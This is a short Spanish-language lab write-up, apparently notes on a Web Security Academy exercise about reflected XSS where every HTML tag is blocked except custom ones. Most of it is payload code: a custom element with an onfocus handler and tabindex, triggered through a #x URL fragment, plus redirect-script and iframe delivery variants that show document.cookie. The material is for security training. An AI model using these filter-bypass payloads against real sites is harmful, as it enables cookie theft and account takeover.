---
title: "15 - Reflected XSS into HTML context with all tags blocked except custom ones"
---

# 15 - Reflected XSS into HTML context with all tags blocked except custom ones

https://www.youtube.com/watch?v=sjs6RS7lURk

Metemos esto en el campo de búsqueda, se va a reflejar en el DOM
```html
<custom-tag onfocus='alert(1)' id='x' tabindex="1">
```

Cuando en la url busquemos https://url#x , estaremos haciendo focus en el elemento y por lo tanto se ejecutará.

Tabindex -> si presiones en la url y le das n veces a tab te salta la alerta, con un custom tag.
==Es necesario usar tabindex ya que custom-tag no es un elemento focusable.==

No podemos usar un autofocus porque no está permitido en los custom-tags, tenemos que usar el attack server  para hacerle llegar al cliente la url que tiene que abrir para que se ejecute el xss:

https://0a8e006b049dd08a80a58f680018009d.web-security-academy.net/?search=%3Ccustom-tag%20onfocus='alert(document.cookie)'%20id='x'%20tabindex=%221%22%3E#x

```html
https://0a8e006b049dd08a80a58f680018009d.web-security-academy.net/?search=<custom-tag onfocus='alert(document.cookie)' id='x' tabindex="1">
```

```html
<script>
location='https://0a8e006b049dd08a80a58f680018009d.web-security-academy.net/?search=%3Ccustom-tag+onfocus%3D%27alert%28document.cookie%29%27+id%3D%27x%27+tabindex%3D%221%22%3E#x'
</script>
```

```html
<iframe 
  src="https://0a8e006b049dd08a80a58f680018009d.web-security-academy.net/?search=%3Ccustom-tag+onfocus%3D%27alert%28document.cookie%29%27+id%3D%27x%27+tabindex%3D%221%22%3E" 
  onload="this.src+='#x">
</iframe>
```
